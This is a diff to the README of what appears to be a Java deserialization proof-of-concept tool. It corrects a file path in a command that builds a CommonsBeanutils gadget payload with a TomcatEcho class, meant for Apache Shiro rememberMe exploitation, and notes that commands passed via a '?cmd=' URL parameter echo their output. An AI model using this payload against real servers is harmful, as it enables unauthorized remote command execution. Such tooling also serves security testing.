@@ -28,7 +28,7 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 使用 TomcatEcho 可以进行输出回显，在url中添加 `?cmd=命令` 即可获得回显
 
-`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_183 classfile:./poc/shiro/TomcatEcho.class.class > echo.ser`
+`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_183 classfile:./poc/shiro/TomcatEcho.class > echo.ser`
 
 
 指定加密模式和反序列化文件生成对应的 rememberMe
